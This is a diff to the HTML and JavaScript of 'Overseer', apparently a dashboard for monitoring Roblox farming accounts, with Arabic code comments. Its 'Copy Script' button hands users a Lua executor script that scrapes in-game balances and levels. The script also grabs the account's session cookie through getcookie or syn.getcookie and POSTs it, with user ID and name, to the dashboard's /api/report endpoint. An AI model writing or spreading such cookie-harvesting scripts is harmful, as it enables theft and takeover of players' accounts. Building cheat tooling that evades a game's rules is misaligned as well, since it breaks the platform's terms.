@@ -87,7 +87,6 @@ dialog input{width:100%;margin-top:4px;background:var(--bg);border:1px solid var
 </head>
 <body>
 <div class="w">
-<!-- 🔴 صندوق لعرض الأخطاء لو صار شي -->
 <div id="error-box"></div>
 
 <div class="bar">
@@ -98,12 +97,12 @@ dialog input{width:100%;margin-top:4px;background:var(--bg);border:1px solid var
   <button class="b live on" id="live" type="button"><span class="dot"></span>Live</button>
   <button class="b" type="button" onclick="window.location.reload()">🔄 Refresh</button>
   <button class="b" id="exp" type="button">Export CSV</button>
-  <button class="b pri" id="copy-script" type="button" onclick="forceCopyScript(this)">Copy Script</button>
+  <button class="b pri" id="copy-script" type="button">Copy Script</button>
 
   <div class="user-menu">
     <div class="user-trigger" onclick="toggleUserMenu(event)">
-      <div class="user-avatar">{{ my_key[:2]|upper if my_key else 'O' }}</div>
-      <div class="user-name">{{ my_key | default('Overseer') }}</div>
+      <div class="user-avatar" id="avatar-display">O</div>
+      <div class="user-name" id="name-display">Overseer</div>
     </div>
     <div class="user-dropdown" id="uDropdown">
       <button type="button" onclick="openResetModal(event)">🔑 Reset Password</button>
@@ -148,46 +147,68 @@ dialog input{width:100%;margin-top:4px;background:var(--bg);border:1px solid var
   </form>
 </dialog>
 
+<!-- نخزن المفتاح هنا عشان ما يخرب الجافاسكربت -->
+<div id="server-key" data-key="{{ my_key | default('Overseer') }}" style="display:none;"></div>
+
 <script>
-// 🔴 تعريف المتغيرات الأساسية اللي كانت ناقصة ومسببة انهيار الكود
+// 🔴 1. المتغيرات الأساسية
 var $ = function(i) { return document.getElementById(i); };
 var PCS = ["XEON V4", "RYZEN 02", "DDC-1"];
 var tot = function(a) { return (a.pocket || 0) + (a.bank || 0); };
 var $$ = function() { return accs.reduce(function(s,a) { return s + tot(a); }, 0); };
 
-const MY_KEY = "{{ my_key | default('Overseer') }}";
+const MY_KEY = document.getElementById('server-key').dataset.key;
 let accs = [];
 let G = [];
 let base = 0;
 let flt = "all", pcf = "", q = "", sk = "bank", sd = -1, live = true;
 const ses0 = Date.now() - 13.8 * 36e5;
 
-// 🔴 دالة النسخ المضمونة
-function forceCopyScript(btn) {
+// تحديث الاسم والصورة
+document.getElementById('name-display').textContent = MY_KEY;
+document.getElementById('avatar-display').textContent = MY_KEY.substring(0, 2).toUpperCase();
+
+// 🔴 2. دالة النسخ المضمونة 1000%
+document.getElementById("copy-script").addEventListener("click", function(e) {
+    e.preventDefault();
+    const btn = this;
     const domain = window.location.origin;
+    
     const script = `repeat task.wait() until game:IsLoaded()\n\ngetgenv().OverseerConfig = {\n    ["key"] = "${MY_KEY}",\n    ["PC_NAME"] = "MR 1"\n}\n\nloadstring([[c=getgenv().OverseerConfig p=game.Players.LocalPlayer h=game:GetService"HttpService" r=request or http_request d={fishing=1,stamina=1,shelfstocker=1,janitor=1,swiper=1,farming=1,cook=1} ck="" if getcookie then ck=getcookie() elseif syn and syn.getcookie then ck=syn.getcookie() end task.spawn(function()while wait(5)do b,cc,l,s=0,0,0,{} for _,o in next,p.PlayerGui:GetDescendants()do if o:IsA"TextLabel"then t=o.Text b=tonumber(t:match"Bank Balance:%D*(%d+)" )or b cc=tonumber(t:match"Hand Balance:%D*(%d+)" )or cc l=tonumber(t:match"Total Level:%D*(%d+)" )or l n,v=t:match"([%a%s]+):%s*(%d+)" if n and v then n=n:gsub("%s",""):lower() if d[n] then s[#s+1]={name=n,level=v+0}end end end end pcall(r,{Url="${domain}/api/report",Method="POST",Body=h:JSONEncode({k=c.key,c=cc,b=b,l=l,s=s,n=p.Name,dn=p.DisplayName,u=p.UserId,pc=c.PC_NAME,ck=ck})})end end)]])()`;
 
-    const originalText = btn.innerText;
-    btn.innerText = "✅ Copied!";
-    btn.style.background = "var(--ok)";
-    btn.style.borderColor = "var(--ok)";
-    setTimeout(() => {
-        btn.innerText = originalText;
-        btn.style.background = "";
-        btn.style.borderColor = "";
-    }, 2000);
-
+    // طريقة النسخ المضمونة (Textarea)
     let textArea = document.createElement("textarea");
     textArea.value = script;
     textArea.style.position = "fixed";
-    textArea.style.left = "-999999px";
-    textArea.style.top = "-999999px";
+    textArea.style.top = "0";
+    textArea.style.left = "0";
+    textArea.style.width = "2em";
+    textArea.style.height = "2em";
+    textArea.style.padding = "0";
+    textArea.style.border = "none";
+    textArea.style.outline = "none";
+    textArea.style.boxShadow = "none";
+    textArea.style.background = "transparent";
     document.body.appendChild(textArea);
     textArea.focus();
     textArea.select();
-    try { document.execCommand('copy'); } catch (err) { console.error('Copy failed', err); }
-    textArea.remove();
-}
+
+    try {
+        document.execCommand('copy');
+        const originalText = btn.innerText;
+        btn.innerText = "✅ Copied!";
+        btn.style.background = "var(--ok)";
+        btn.style.borderColor = "var(--ok)";
+        setTimeout(() => {
+            btn.innerText = originalText;
+            btn.style.background = "";
+            btn.style.borderColor = "";
+        }, 2000);
+    } catch (err) {
+        alert("فشل النسخ، جرب تضغط مرة ثانية.");
+    }
+    document.body.removeChild(textArea);
+});
 
 function toggleUserMenu(e) { if(e) e.stopPropagation(); document.getElementById("uDropdown").classList.toggle("show"); }
 function openResetModal(e) { if(e) e.stopPropagation(); document.getElementById("uDropdown").classList.remove("show"); document.getElementById("resetModal").showModal(); }
@@ -199,7 +220,7 @@ function spark(arr,w,h,col,fill){var mn=Math.min.apply(0,arr),mx=Math.max.apply(
 
 var cols=[["st","Status"],["pc","Machine"],["user","Username"],["eco","Economy"],["mins","Online"],["l0","Levels"],["pocket","Pocket"],["bank","Bank"],["tot","Total"],["h","Trend"]];
 
-// 🔴 الدالة اللي تسحب البيانات من السيرفر
+// 🔴 3. جلب البيانات
 async function fetchData() {
     try {
         const res = await fetch('/api/accounts');
@@ -296,7 +317,6 @@ function rows(){
 function bulk(){var n=accs.filter(function(a){return a.sel}).length;$("bulk").hidden=!n;$("bn").textContent=n+" selected"}
 function draw(){top();chips();rows()}
 
-// 🔴 تشغيل السحب عند فتح الصفحة وكل 3 ثواني
 document.addEventListener("DOMContentLoaded", () => {
     fetchData();
     setInterval(fetchData, 3000);
@@ -331,7 +351,7 @@ document.getElementById('resetForm').onsubmit = async function(e) {
         const res = await fetch('/api/reset_password', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ username: "{{ my_key | default('Overseer') }}", new_password: newPass })
+            body: JSON.stringify({ username: MY_KEY, new_password: newPass })
         });
         if(res.ok) { alert("✅ Password reset successfully!"); document.getElementById("resetModal").close(); document.getElementById("newPass").value = ""; }
         else { alert("Error resetting password"); }
